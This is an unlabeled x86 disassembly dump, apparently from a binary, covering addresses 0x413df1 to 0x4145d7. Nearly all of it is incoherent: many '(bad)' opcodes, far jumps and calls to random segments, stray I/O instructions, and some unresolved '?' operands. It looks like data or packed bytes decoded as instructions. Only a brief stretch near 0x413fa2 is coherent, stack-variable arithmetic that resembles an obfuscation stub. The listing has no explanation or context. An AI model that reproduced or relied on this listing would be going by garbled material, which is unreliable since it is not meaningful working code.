  413df1:	xchg   BYTE PTR [edx+0x33dc3537],bh
  413df7:	iret   
  413df8:	stc    
  413df9:	add    al,0xf
  413dfb:	fst    DWORD PTR [eax-0x5]
  413dfe:	mov    edx,0x7103599a
  413e03:	dec    esp
  413e04:	into   
  413e05:	add    BYTE PTR [ecx+0x3e6b0569],ch
  413e0b:	pushf  
  413e0c:	jmp    0x413dd2
  413e0e:	retf   0x3fe5
  413e11:	test   eax,0xe6659585
  413e16:	es gs add bl,bh
  413e1a:	push   ss
  413e1b:	nop
  413e1c:	jne    0x413e3e
  413e1e:	popa   
  413e1f:	test   al,0x3b
  413e21:	(bad)  
  413e22:	test   DWORD PTR [eax+0xd7c8d1],esi
  413e28:	daa    
  413e29:	push   ss
  413e2a:	cmp    al,0xc5
  413e2c:	pop    ebx
  413e2d:	sub    eax,0x17b1f4ed
  413e32:	cs dec edi
  413e34:	push   edx
  413e35:	jl     0x413dc4
  413e37:	jns    0x413e5f
  413e39:	dec    eax
  413e3a:	inc    edi
  413e3b:	jne    0x413eb2
  413e3d:	shl    BYTE PTR [ecx],1
  413e3f:	mov    ebx,0x64bce7f3
  413e44:	fs in  eax,0xa0
  413e47:	mov    ebp,0x96a0c1fd
  413e4c:	dec    esi
  413e4d:	and    dl,dh
  413e4f:	jns    0x413e33
  413e51:	dec    eax
  413e52:	cmp    eax,0xefe2e5f4
  413e57:	xchg   edi,eax
  413e58:	(bad)  
  413e59:	(bad)  
  413e5a:	adc    al,0x27
  413e5c:	push   edx
  413e5d:	push   0xffffffe1
  413e5f:	jmp    0xa6d8:0x876dc4a0
  413e66:	test   BYTE PTR [ebp+0x1f],bl
  413e69:	cs call 0x9050:0xe3e9ba01
  413e71:	inc    edx
  413e72:	pop    es
  413e73:	xchg   ebx,eax
  413e74:	xor    eax,ebp
  413e76:	ret    
  413e77:	cli    
  413e78:	cld    
  413e79:	jae    0x413e61
  413e7b:	xchg   ebx,eax
  413e7c:	fcomp  QWORD PTR [edi]
  413e7e:	dec    edx
  413e7f:	call   0xa914:0xa665a637
  413e86:	setge  BYTE PTR [edi-0x5f86a2f9]
  413e8d:	scas   al,BYTE PTR es:[edi]
  413e8e:	test   BYTE PTR [ebp+0x7e1513e5],0xd6
  413e95:	je     0x413ecd
  413e97:	pop    ebx
  413e98:	and    esi,DWORD PTR [ecx-0x42df421c]
  413e9e:	stos   DWORD PTR es:[edi],eax
  413e9f:	cwde   
  413ea0:	lods   al,BYTE PTR ds:[esi]
  413ea1:	xchg   ebx,eax
  413ea2:	jmp    0x413edd
  413ea4:	push   edi
  413ea5:	scas   eax,DWORD PTR es:[edi]
  413ea6:	mul    BYTE PTR [ebp-0x822ed3b]
  413eac:	repnz mov BYTE PTR [ebx],bh
  413eaf:	ds int 0xc4
  413eb2:	cmp    al,0x34
  413eb4:	pop    eax
  413eb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413eb6:	and    bl,BYTE PTR [esi]
  413eb8:	mov    ds:0x7b5a4af8,al
  413ebd:	dec    edx
  413ebe:	fist   WORD PTR [ecx-0x39]
  413ec1:	push   edx
  413ec2:	sub    dl,cl
  413ec4:	xchg   ebx,eax
  413ec5:	adc    bl,ah
  413ec7:	mov    eax,ds:0xc97673ee
  413ecc:	jb     0x413f15
  413ece:	rcr    DWORD PTR [edx-0x48],0xe0
  413ed2:	clc    
  413ed3:	cmp    eax,0x9d34f3d
  413ed8:	sub    ebx,DWORD PTR [ecx]
  413eda:	add    DWORD PTR [ebx+0x279d7846],esp
  413ee0:	shr    BYTE PTR [edi+0x4485627],1
  413ee6:	push   0x83aaa720
  413eeb:	cmp    esi,edx
  413eed:	aas    
  413eee:	xor    esi,DWORD PTR [ebx]
  413ef0:	lahf   
  413ef1:	aas    
  413ef2:	push   ebp
  413ef3:	jecxz  0x413f0e
  413ef5:	jne    0x413e97
  413ef7:	and    DWORD PTR [edx-0x3d],esi
  413efa:	pop    esp
  413efb:	repz inc ecx
  413efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413efe:	js     0x413eed
  413f00:	dec    ebp
  413f01:	cmp    al,0xb3
  413f03:	das    
  413f04:	and    eax,0x8bc33208
  413f09:	xchg   ecx,eax
  413f0a:	clc    
  413f0b:	xor    al,0x68
  413f0d:	sub    ch,0xe1
  413f10:	pop    eax
  413f11:	sahf   
  413f12:	xchg   esi,eax
  413f13:	ja     0x413f35
  413f15:	(bad)  
  413f16:	shr    ebp,0xfb
  413f19:	pop    eax
  413f1a:	test   BYTE PTR [ebx-0x35c12fd0],0xd7
  413f21:	inc    ebx
  413f22:	sub    DWORD PTR [ecx+edx*8+0x5b7d3ed6],edx
  413f29:	add    eax,0x4c824a2
  413f2e:	xchg   BYTE PTR [ecx-0x39],bl
  413f31:	push   DWORD PTR [eax+0x4c]
  413f34:	mov    cl,0x67
  413f36:	push   ss
  413f37:	ja     0x413f2d
  413f39:	dec    edx
  413f3a:	mov    eax,0x25633357
  413f3f:	mov    ch,0xe
  413f41:	dec    edx
  413f42:	lea    edx,[ebx+0x6]
  413f45:	sbb    al,0x47
  413f47:	and    DWORD PTR [eax+0x582b9e8b],0x7934961a
  413f51:	enter  0x12f1,0x38
  413f55:	dec    esp
  413f56:	shr    DWORD PTR [ebx-0x51],cl
  413f59:	cwde   
  413f5a:	addr16 pop edi
  413f5c:	sti    
  413f5d:	xchg   esi,eax
  413f5e:	js     0x413f0a
  413f60:	lea    eax,[edi+0x52]
  413f63:	cmp    edi,DWORD PTR ds:0x366d9c4d
  413f69:	out    0xc9,al
  413f6b:	test   bl,ch
  413f6d:	leave  
  413f6e:	push   ss
  413f6f:	das    
  413f70:	scas   al,BYTE PTR es:[edi]
  413f71:	and    BYTE PTR [esi+0x66728305],0x91
  413f78:	addr16 pop ecx
  413f7a:	addr16 pop ss
  413f7c:	mov    ds:0xce3d96c2,al
  413f81:	or     dh,dh
  413f83:	aam    0xba
  413f85:	scas   al,BYTE PTR es:[edi]
  413f86:	call   0x309c:0xa4310b83
  413f8d:	(bad)  
  413f8e:	sahf   
  413f8f:	ja     0x413fa4
  413f91:	shl    BYTE PTR [ecx],0x8
  413f94:	lock sub BYTE PTR [edx-0x74c3a295],bl
  413f9b:	push   ebp
  413f9c:	or     BYTE PTR [ebx-0x2fcc07a3],cl
  413fa2:	xor    ebx,eax
  413fa4:	sub    edx,ebx
  413fa6:	sub    edx,esi
  413fa8:	xor    edx,eax
  413faa:	mov    DWORD PTR [ebp+0x8],edx
  413fad:	mov    edx,DWORD PTR [ebp+0x8]
  413fb0:	mov    ebx,DWORD PTR [ebp-0x58]
  413fb3:	add    edx,0x5708c4
  413fb9:	imul   edx,ebx
  413fbc:	mov    DWORD PTR [ebp-0x58],edx
  413fbf:	mov    edx,DWORD PTR [ebp+0x8]
  413fc2:	mov    ebx,DWORD PTR [ebp-0x54]
  413fc5:	add    edx,0x64f8da
  413fcb:	or     edx,ebx
  413fcd:	mov    DWORD PTR [ebp-0x54],edx
  413fd0:	mov    edx,DWORD PTR [ebp+0x8]
  413fd3:	mov    ebx,DWORD PTR [ebp-0x50]
  413fd6:	add    edx,ecx
  413fd8:	xor    edx,ebx
  413fda:	mov    DWORD PTR [ebp-0x50],edx
  413fdd:	mov    edx,DWORD PTR [ebp+0x8]
  413fe0:	mov    ebx,DWORD PTR [ebp-0x4c]
  413fe3:	add    edx,edi
  413fe5:	and    edx,ebx
  413fe7:	mov    DWORD PTR [ebp-0x4c],edx
  413fea:	mov    edx,DWORD PTR [ebp+0x8]
  413fed:	mov    ebx,DWORD PTR [ebp-0x48]
  413ff0:	lea    edx,[ebx+edx*1+0x241fc1f]
  413ff7:	mov    DWORD PTR [ebp-0x48],edx
  413ffa:	mov    edx,DWORD PTR [ebp+0x8]
  413ffd:	mov    ebx,0xfa5e15e2
  414002:	jmp    0x4163b6
  414007:	scas   eax,DWORD PTR es:[edi]
  414008:	shl    BYTE PTR [eax-0x7f],cl
  41400b:	jno    0x413f90
  41400d:	scas   eax,DWORD PTR es:[edi]
  41400e:	mov    dl,0xfb
  414010:	xor    DWORD PTR [edi-0x3e],edx
  414013:	in     eax,dx
  414014:	test   al,0x52
  414016:	or     DWORD PTR [edx-0x1483838c],esp
  41401c:	pop    edi
  41401d:	jl     0x41409b
  41401f:	aaa    
  414020:	jmp    0xc2ee:0xc48baa3
  414027:	pop    esi
  414028:	push   eax
  414029:	adc    DWORD PTR [ecx-0x1e20358b],esp
  41402f:	imul   edi,DWORD PTR [ebx-0xe],0x42
  414033:	cwde   
  414034:	sub    BYTE PTR [ecx-0x7eb6ac92],ah
  41403a:	mov    ?,ebx
  41403c:	into   
  41403d:	sbb    al,0x8e
  41403f:	cmp    al,0x63
  414041:	fmul   st,st(2)
  414043:	or     BYTE PTR [eax-0x67],dh
  414046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414047:	scas   eax,DWORD PTR es:[edi]
  414048:	popa   
  414049:	in     al,0x6f
  41404b:	in     al,dx
  41404c:	inc    ebx
  41404d:	mov    dh,0x9c
  41404f:	sub    esi,DWORD PTR [eax]
  414051:	xor    eax,0x359a5ece
  414056:	sbb    eax,0x5b1c03b2
  41405b:	es retf 0x6d2d
  41405f:	scas   al,BYTE PTR es:[edi]
  414060:	stos   DWORD PTR es:[edi],eax
  414061:	sbb    al,0xd5
  414063:	outs   dx,BYTE PTR ds:[esi]
  414064:	dec    esp
  414065:	jne    0x414058
  414067:	xchg   edi,eax
  414068:	frstor [ebx-0x33bba413]
  41406e:	mov    bl,0xbd
  414070:	jo     0x41406b
  414072:	std    
  414073:	add    ah,0xcd
  414076:	or     al,0x31
  414078:	(bad)  
  414079:	fs call 0xa574:0xfe06b794
  414081:	jae    0x414069
  414083:	je     0x4140c5
  414085:	scas   eax,DWORD PTR es:[edi]
  414086:	cli    
  414087:	out    dx,eax
  414088:	pop    ebx
  414089:	rol    BYTE PTR [ebx-0x34945097],0xe6
  414090:	lods   al,BYTE PTR ds:[esi]
  414091:	in     al,0x3b
  414093:	iret   
  414094:	pop    es
  414095:	fcmovb st,st(6)
  414097:	mov    edx,0xcc5ccd5e
  41409c:	add    cl,BYTE PTR [edi-0x71fc9d16]
  4140a2:	cmc    
  4140a3:	mov    eax,0x85c56ad6
  4140a8:	cmp    al,0x73
  4140aa:	shl    DWORD PTR [ebx+0x79],cl
  4140ad:	mov    bl,0x7f
  4140af:	jg     0x41407f
  4140b1:	nop
  4140b2:	sub    eax,DWORD PTR [ebx+0x1e299216]
  4140b8:	pop    ebx
  4140b9:	or     al,BYTE PTR [ebx-0x20]
  4140bc:	push   ss
  4140bd:	inc    edi
  4140be:	shr    DWORD PTR [eax-0x8],cl
  4140c1:	inc    ebp
  4140c2:	or     BYTE PTR [ecx+0x6d],dl
  4140c5:	popf   
  4140c6:	inc    ecx
  4140c7:	pop    ebx
  4140c8:	nop
  4140c9:	pop    esp
  4140ca:	jg     0x4140db
  4140cc:	div    ebx
  4140ce:	sbb    al,dl
  4140d0:	sbb    eax,0x2eb40477
  4140d5:	pop    ecx
  4140d6:	(bad)  [eax+ebp*4-0x5d]
  4140da:	dec    edi
  4140db:	aaa    
  4140dc:	mov    BYTE PTR [edi-0x1082d052],0xb6
  4140e3:	jo     0x4140cd
  4140e5:	and    bh,BYTE PTR [eax-0x3a]
  4140e8:	cli    
  4140e9:	repnz aas 
  4140eb:	or     DWORD PTR [bx+di-0x2b23],0x53324e16
  4140f4:	ds (bad) 
  4140f6:	mov    ebx,0x7565f614
  4140fb:	stos   DWORD PTR es:[edi],eax
  4140fc:	mov    ds,WORD PTR [edx-0x4ad361]
  414102:	jge    0x41415d
  414104:	dec    BYTE PTR [edx+0x15b3cf3d]
  41410a:	inc    edi
  41410b:	stc    
  41410c:	out    0x6d,eax
  41410e:	push   edi
  41410f:	dec    edx
  414110:	(bad)  
  414111:	out    dx,al
  414112:	or     eax,DWORD PTR [edi-0x67]
  414115:	cmp    esi,DWORD PTR [eax]
  414117:	xor    edx,ebp
  414119:	rcr    BYTE PTR [esp+ebx*2-0x33],cl
  41411d:	inc    edi
  41411e:	ret    0x1a59
  414121:	mov    ds:0xc4580830,al
  414126:	mov    al,ds:0x68e65215
  41412b:	aad    0xd3
  41412d:	push   eax
  41412e:	int3   
  41412f:	stos   DWORD PTR es:[edi],eax
  414130:	call   0xb96c1de8
  414135:	std    
  414136:	loop   0x41419c
  414138:	jg     0x41414d
  41413a:	cwde   
  41413b:	call   0x447d89b0
  414140:	or     BYTE PTR [ebx+0x43ec9843],bh
  414146:	fldlg2 
  414148:	dec    edi
  414149:	xlat   BYTE PTR ds:[ebx]
  41414a:	leave  
  41414b:	dec    esi
  41414c:	pop    eax
  41414d:	dec    ebx
  41414e:	loopne 0x41414e
  414150:	pop    ecx
  414151:	push   ecx
  414152:	mov    al,0xe
  414154:	(bad)  
  414155:	loope  0x4141a2
  414157:	mov    edi,0x950ce80c
  41415c:	mov    cl,bh
  41415e:	pop    ds
  41415f:	iret   
  414160:	call   0x5eaaddea
  414165:	xchg   edx,eax
  414166:	jle    0x414176
  414168:	in     al,dx
  414169:	jecxz  0x4141ab
  41416b:	inc    esi
  41416c:	rol    ch,1
  41416e:	cli    
  41416f:	xchg   DWORD PTR [ebx],ecx
  414171:	pop    esi
  414172:	iret   
  414173:	pop    esp
  414174:	ja     0x4141bb
  414176:	pop    edi
  414177:	jmp    0x288de0f3
  41417c:	xchg   BYTE PTR ds:0xdefc01d6,al
  414182:	cld    
  414183:	out    0x31,al
  414185:	dec    ecx
  414186:	xor    ebp,DWORD PTR [ebx+ebp*1+0x7253ab20]
  41418d:	sub    esp,DWORD PTR [edi+edi*2+0x16]
  414191:	or     DWORD PTR [edi],0x9582a20
  414197:	inc    edx
  414198:	sbb    ecx,esp
  41419a:	mov    ebp,0xb956bbdb
  41419f:	push   eax
  4141a0:	retf   0x3fee
  4141a3:	mov    ds:0xe77a1ed5,al
  4141a8:	push   eax
  4141a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141aa:	inc    esp
  4141ab:	(bad)  
  4141ac:	sub    al,0xad
  4141ae:	repnz cmovnp esp,DWORD PTR [edi]
  4141b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141b3:	sbb    dh,BYTE PTR [eax+0x7bd92ce2]
  4141b9:	in     eax,dx
  4141ba:	out    0xf2,al
  4141bc:	mov    al,ds:0x732d6d69
  4141c1:	gs mov esi,0x4e1fa6eb
  4141c7:	jo     0x414234
  4141c9:	aaa    
  4141ca:	scas   eax,DWORD PTR es:[edi]
  4141cb:	inc    eax
  4141cc:	lods   al,BYTE PTR ds:[esi]
  4141cd:	aam    0x3
  4141cf:	adc    al,0xd8
  4141d1:	ins    DWORD PTR es:[edi],dx
  4141d2:	outs   dx,BYTE PTR ds:[esi]
  4141d3:	mov    edx,0x4c733030
  4141d8:	fld    st(4)
  4141da:	mov    edi,0xbf887c45
  4141df:	push   esi
  4141e0:	push   0x10a700eb
  4141e5:	xor    edx,DWORD PTR ss:[ebp+esi*2-0x57977ca7]
  4141ed:	pushf  
  4141ee:	icebp  
  4141ef:	push   edx
  4141f0:	int3   
  4141f1:	fstp   DWORD PTR [ebp-0x3b]
  4141f4:	push   edi
  4141f5:	loope  0x414276
  4141f7:	xor    ch,bl
  4141f9:	mov    ah,0xf6
  4141fb:	mov    ds:0xa29427e8,eax
  414200:	test   al,0x73
  414202:	sbb    al,BYTE PTR [eax+0x28968e92]
  414208:	fst    QWORD PTR [edx+ebx*4]
  41420b:	push   ebx
  41420c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41420d:	mov    ch,0x18
  41420f:	jp     0x41427b
  414211:	sub    edx,DWORD PTR [si+0x28]
  414215:	(bad)  
  414216:	enter  0x7156,0xd5
  41421a:	push   ss
  41421b:	dec    sp
  41421d:	(bad)  
  41421e:	mov    al,0x58
  414220:	push   ebp
  414221:	into   
  414222:	dec    ebx
  414223:	nop
  414224:	arpl   WORD PTR [ebp+0x70],di
  414227:	add    ebx,DWORD PTR [edx]
  414229:	mov    esi,0x8d889db7
  41422e:	add    al,0xbf
  414230:	dec    ebp
  414231:	mov    dh,0x61
  414233:	and    BYTE PTR [ebx*2-0x24e2aa97],ah
  41423a:	adc    ebp,DWORD PTR [ebx+0x15]
  41423d:	xor    al,0xb2
  41423f:	dec    ecx
  414240:	rcl    BYTE PTR [esi+0x18e3da42],0xd2
  414247:	test   al,0x92
  414249:	or     dl,BYTE PTR [eax-0x1b]
  41424c:	stos   DWORD PTR es:[edi],eax
  41424d:	(bad)  
  41424e:	outs   dx,DWORD PTR ds:[esi]
  41424f:	repz pop ebx
  414251:	jbe    0x4142c0
  414253:	cld    
  414254:	jnp    0x414290
  414256:	(bad)  
  414257:	pop    edi
  414258:	pop    ebp
  414259:	xor    DWORD PTR [edx-0x2e],esp
  41425c:	jne    0x41422e
  41425e:	fwait
  41425f:	mov    eax,ebp
  414261:	aad    0xbf
  414263:	jg     0x4141f6
  414265:	and    dl,BYTE PTR [eax]
  414267:	and    al,0x27
  414269:	or     BYTE PTR [ebp+edi*2+0x23],0xb7
  41426e:	mov    ebp,cs
  414270:	addr16 enter 0x398,0x6e
  414275:	pop    esp
  414276:	mov    BYTE PTR [ebp+0x1f],cl
  414279:	and    DWORD PTR [edx],edi
  41427b:	ror    DWORD PTR [edi-0x7f],0xbc
  41427f:	repz (bad) [edx-0x18ce716f]
  414286:	ret    
  414287:	mov    ecx,0xc28070a2
  41428c:	mov    WORD PTR [ebp+0x3d9d78c8],es
  414292:	dec    eax
  414293:	icebp  
  414294:	mov    ds:0xd0e78dfb,eax
  414299:	aam    0xc8
  41429b:	and    BYTE PTR [eax+0x62],al
  41429e:	xchg   esi,eax
  41429f:	mov    ds:0x9cb9b3fd,al
  4142a4:	icebp  
  4142a5:	cmp    al,0x30
  4142a7:	xchg   esi,eax
  4142a8:	mov    dl,0x7
  4142aa:	xchg   esp,eax
  4142ab:	push   ebp
  4142ac:	repnz mov dh,0x77
  4142af:	jmp    0xf5c6:0xada8378b
  4142b6:	pop    esp
  4142b7:	(bad)  
  4142b8:	pop    ebp
  4142b9:	or     edx,ebp
  4142bb:	pop    edi
  4142bc:	mov    bl,0x85
  4142be:	xchg   edx,eax
  4142bf:	cdq    
  4142c0:	pop    esi
  4142c1:	ins    BYTE PTR es:[edi],dx
  4142c2:	mov    ebx,0x6aedebb6
  4142c7:	scas   al,BYTE PTR es:[edi]
  4142c8:	sbb    dl,cl
  4142ca:	cwde   
  4142cb:	stc    
  4142cc:	stc    
  4142cd:	rcl    BYTE PTR [esp+edi*4],1
  4142d0:	pop    ds
  4142d1:	jmp    FWORD PTR [eax]
  4142d3:	adc    dl,BYTE PTR [ecx+0x516766e9]
  4142d9:	outs   dx,BYTE PTR ds:[esi]
  4142da:	lahf   
  4142db:	xor    edx,DWORD PTR [ebx]
  4142dd:	lahf   
  4142de:	ret    0xf6d5
  4142e1:	dec    edx
  4142e2:	jge    0x4142ec
  4142e4:	fcomp  DWORD PTR [ebx+0x63e41695]
  4142ea:	imul   ecx,DWORD PTR [edi],0xffffffe8
  4142ed:	aam    0x6a
  4142ef:	and    al,0x49
  4142f1:	ret    0x9756
  4142f4:	arpl   si,di
  4142f6:	sbb    ch,BYTE PTR [ebp-0x41]
  4142f9:	pop    edx
  4142fa:	stc    
  4142fb:	fwait
  4142fc:	rcr    bh,0x36
  4142ff:	fcomp  DWORD PTR ds:0xa1c68c9d
  414305:	scas   eax,DWORD PTR es:[edi]
  414306:	xor    bl,BYTE PTR [edx+0x20c7f7a0]
  41430c:	inc    ecx
  41430d:	stc    
  41430e:	mov    dh,0x91
  414310:	and    eax,0xc8bc5e51
  414315:	and    eax,0xdfbe031
  41431a:	mov    ecx,0x1db21de5
  41431f:	pop    ecx
  414320:	sbb    dh,al
  414322:	es mov esi,0xaa797d6d
  414328:	mov    esp,0x7ae84f4f
  41432d:	in     eax,dx
  41432e:	xchg   edx,eax
  41432f:	mov    eax,ds:0x37e6e23d
  414334:	retf   
  414335:	test   al,0xc5
  414337:	rcl    dh,1
  414339:	not    DWORD PTR [eax]
  41433b:	aad    0x4d
  41433d:	jmp    0xbe88:0x29c695e9
  414344:	data16 xor ch,BYTE PTR [ecx-0x45c19d1f]
  41434b:	jge    0x41436e
  41434d:	xchg   edi,eax
  41434e:	bound  ebx,QWORD PTR [edx-0x2eb5e7e8]
  414354:	sub    dh,al
  414356:	push   esi
  414357:	sbb    edx,esp
  414359:	inc    eax
  41435a:	adc    eax,0x9c9d3ae7
  41435f:	mov    ds:0xd4cf1534,eax
  414364:	imul   esi,DWORD PTR [ecx+esi*8],0xffffff83
  414368:	cld    
  414369:	jns    0x414305
  41436b:	mov    ss,ebp
  41436d:	sbb    eax,0xe3431d74
  414372:	inc    esp
  414373:	push   esp
  414374:	scas   eax,DWORD PTR es:[edi]
  414375:	popa   
  414376:	iret   
  414377:	stos   BYTE PTR es:[edi],al
  414378:	cmc    
  414379:	imul   edx,DWORD PTR [eax+0x4a],0x16
  41437d:	xchg   edi,eax
  41437e:	jne    0x41435d
  414380:	pop    edi
  414381:	mov    esp,0x3f524657
  414386:	xor    edi,DWORD PTR [esi+0x40851069]
  41438c:	mov    ds:0x4683189,al
  414391:	ss and dh,bh
  414394:	jb     0x414403
  414396:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414397:	inc    esi
  414398:	pusha  
  414399:	jbe    0x414390
  41439b:	lock and ebx,0xc1b642b3
  4143a2:	push   ebx
  4143a3:	pushf  
  4143a4:	xchg   edx,eax
  4143a5:	xor    dh,BYTE PTR [esi-0x39c81b44]
  4143ab:	mov    ah,0x67
  4143ad:	stc    
  4143ae:	or     eax,0x45fecedf
  4143b3:	and    BYTE PTR [esi-0x1c],0xf7
  4143b7:	adc    al,BYTE PTR [edx-0x3db68cfb]
  4143bd:	mov    ebx,0xba75ffaa
  4143c2:	test   BYTE PTR [ecx+0x500a47d5],bl
  4143c8:	mov    cl,BYTE PTR [ecx+0x15080ab]
  4143ce:	xor    ch,BYTE PTR [ebx+0x4]
  4143d1:	jg     0x41441a
  4143d3:	sub    ebp,eax
  4143d5:	inc    edx
  4143d6:	setno  BYTE PTR [ebx-0x289208c]
  4143dd:	sub    esp,0x33
  4143e0:	mov    ch,0x78
  4143e2:	jle    0x414420
  4143e4:	inc    edi
  4143e5:	data16 icebp 
  4143e7:	add    dl,BYTE PTR [edx+edi*2+0x78cf487d]
  4143ee:	jge    0x4143bf
  4143f0:	hlt    
  4143f1:	aas    
  4143f2:	xor    al,0xc5
  4143f4:	xor    al,0x4
  4143f6:	xchg   DWORD PTR [edx-0x44],ecx
  4143f9:	lds    edx,FWORD PTR [edx+0x678e5776]
  4143ff:	mov    ebp,0xc496b6f7
  414404:	and    edi,DWORD PTR [edi+0x51]
  414407:	fwait
  414408:	mov    al,0x47
  41440a:	jbe    0x4143d0
  41440c:	mov    DWORD PTR gs:[eax+0x66],edi
  414410:	xchg   ebx,eax
  414411:	dec    edi
  414412:	inc    esi
  414413:	int    0x1
  414415:	cmp    esp,ecx
  414417:	inc    esi
  414418:	pushf  
  414419:	jmp    0xc4cce4d8
  41441e:	gs jb  0x4143cc
  414421:	aad    0x7e
  414423:	or     ah,al
  414425:	int3   
  414426:	sahf   
  414427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414428:	out    dx,al
  414429:	xchg   edx,eax
  41442a:	xor    ebx,DWORD PTR [ebx-0x53]
  41442d:	sub    edi,eax
  41442f:	push   esp
  414430:	and    ch,BYTE PTR [edx]
  414432:	mov    esi,0x1796871a
  414437:	cwde   
  414438:	push   esp
  414439:	cmp    eax,0xae451dd6
  41443e:	jle    0x414401
  414440:	ret    0xb5a6
  414443:	and    esi,DWORD PTR [edi-0x65eb2c8d]
  414449:	ror    BYTE PTR [edx-0x67],cl
  41444c:	add    eax,0xadbca468
  414451:	mov    ah,0x75
  414453:	and    al,0xf5
  414455:	pop    edi
  414456:	xor    al,0x82
  414458:	jns    0x414419
  41445a:	(bad)  
  41445b:	in     eax,dx
  41445c:	lods   al,BYTE PTR ds:[esi]
  41445d:	jmp    0x4670:0x35af7c8f
  414464:	pop    es
  414465:	rol    esi,cl
  414467:	inc    ebp
  414468:	pop    eax
  414469:	jge    0x41446d
  41446b:	dec    esp
  41446d:	cmp    bl,ah
  41446f:	je     0x41447f
  414471:	sbb    bh,BYTE PTR [ecx]
  414473:	cmp    al,0xcf
  414475:	stos   BYTE PTR es:[edi],al
  414476:	sar    eax,0x20
  414479:	or     edi,DWORD PTR [ebx+0x46f478e3]
  41447f:	mov    ecx,0x7144d5f2
  414484:	pop    ebp
  414485:	setns  al
  414488:	fldenv [ecx]
  41448a:	test   ch,bh
  41448c:	repnz cs ror cl,0x27
  414491:	mov    eax,0xb3da6f53
  414496:	dec    ebp
  414497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414498:	sbb    ch,BYTE PTR ds:0x3982a68
  41449e:	or     esi,0xf279cca0
  4144a4:	inc    edi
  4144a5:	stos   BYTE PTR es:[edi],al
  4144a6:	mul    BYTE PTR [ebp-0x60]
  4144a9:	imul   ebp,ebp,0x3bfca384
  4144af:	lods   eax,DWORD PTR ds:[esi]
  4144b0:	adc    esi,DWORD PTR [esi+0x72]
  4144b3:	adc    ebp,DWORD PTR [ebx+edi*8+0x4f]
  4144b7:	sbb    eax,0xc12d7659
  4144bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144bd:	aaa    
  4144be:	inc    edx
  4144bf:	fdiv   DWORD PTR [ebx+0x1e]
  4144c2:	inc    edx
  4144c3:	rol    BYTE PTR [ebp+0x614c9aa4],1
  4144c9:	jne    0x414472
  4144cb:	mov    esi,0xb732ba40
  4144d0:	jmp    0x3122230d
  4144d5:	jne    0x414541
  4144d7:	(bad)  
  4144d8:	stc    
  4144d9:	mov    WORD PTR [ecx-0x4671ef72],ds
  4144df:	adc    bl,BYTE PTR [edi]
  4144e1:	mov    esi,?
  4144e3:	mov    cl,0xd4
  4144e5:	cmc    
  4144e6:	dec    edi
  4144e7:	out    0xcd,eax
  4144e9:	add    al,0xe6
  4144eb:	gs frstor fs:[ebx-0x41]
  4144f0:	int    0xbd
  4144f2:	sub    eax,0x4c4b3893
  4144f7:	and    eax,0x58fee34b
  4144fc:	inc    esi
  4144fd:	dec    esp
  4144fe:	test   al,0x22
  414500:	or     BYTE PTR [ecx+edx*2-0x3ac4ce27],al
  414507:	fldcw  WORD PTR [ecx+eax*2]
  41450a:	pop    edx
  41450b:	sbb    al,0x39
  41450d:	test   BYTE PTR [ebp+0x1],al
  414510:	test   eax,0x9885608c
  414515:	mov    ebp,0xdda8fdad
  41451a:	sbb    DWORD PTR [eax-0x33ac3f5d],esp
  414520:	sbb    BYTE PTR ds:0xa71516ee,ah
  414526:	sbb    BYTE PTR [ebx+0x7d],dl
  414529:	xor    edi,ecx
  41452b:	pop    ss
  41452c:	add    al,0xce
  41452e:	and    DWORD PTR [edx-0x2c],0x18
  414532:	loopne 0x4144ef
  414534:	or     eax,0x8a6dcea4
  414539:	adc    eax,0x2fc576f
  41453e:	dec    eax
  41453f:	bound  esp,QWORD PTR ds:[edi-0x2fe4e3d3]
  414546:	cmp    al,0x54
  414548:	arpl   di,di
  41454a:	jb     0x4144e1
  41454c:	fnstenv [ebp+0x4f]
  41454f:	pop    ecx
  414550:	sbb    DWORD PTR [eax+0x18],ebx
  414553:	adc    al,0x43
  414555:	scas   eax,DWORD PTR es:[edi]
  414556:	iret   
  414557:	lea    edi,ds:0xc08597a5
  41455d:	push   edx
  41455e:	mov    dl,0xcb
  414560:	mov    cs,WORD PTR [esi+0xe]
  414563:	cmp    edx,ebx
  414565:	mov    DWORD PTR [esi+0xd],edx
  414568:	add    al,0x75
  41456a:	ins    DWORD PTR es:[edi],dx
  41456b:	and    bh,BYTE PTR [ecx+0x3529edd0]
  414571:	cli    
  414572:	pop    esi
  414573:	call   0xddb53765
  414578:	push   ss
  414579:	fld    TBYTE PTR [eax+eiz*4]
  41457c:	lds    edi,FWORD PTR [eax+edi*1+0x3e26735a]
  414583:	enter  0x486,0x5a
  414587:	fdivr  DWORD PTR [edx]
  414589:	out    dx,al
  41458a:	in     eax,0x31
  41458c:	scas   al,BYTE PTR es:[edi]
  41458d:	jnp    0x41453e
  41458f:	jnp    0x414545
  414591:	jl     0x41458b
  414593:	pop    ss
  414594:	pop    esi
  414595:	das    
  414596:	in     eax,0x9e
  414598:	fcom   QWORD PTR [ecx]
  41459a:	int    0x1b
  41459c:	inc    edi
  41459d:	imul   ebp,edi,0x5d258e58
  4145a3:	outs   dx,BYTE PTR es:[esi]
  4145a5:	adc    al,0xf
  4145a7:	retf   
  4145a8:	dec    esi
  4145a9:	lods   eax,DWORD PTR ds:[esi]
  4145aa:	push   esp
  4145ab:	lods   eax,DWORD PTR ds:[esi]
  4145ac:	(bad)  
  4145ad:	fndisi(8087 only) 
  4145af:	setns  BYTE PTR [ecx+0x7af027e7]
  4145b6:	push   ebp
  4145b7:	adc    BYTE PTR [edx],al
  4145b9:	adc    BYTE PTR [esi+0x51a3927e],al
  4145bf:	std    
  4145c0:	add    edx,DWORD PTR [ecx]
  4145c2:	fstp   DWORD PTR [edx-0x2b]
  4145c5:	adc    eax,0x95c697c6
  4145ca:	stos   BYTE PTR es:[edi],al
  4145cb:	dec    eax
  4145cc:	pusha  
  4145cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145ce:	push   0xad7121e4
  4145d3:	add    bl,BYTE PTR [esi+eiz*8+0x5d]
  4145d7:	cvtdq2ps xmm6,xmm5
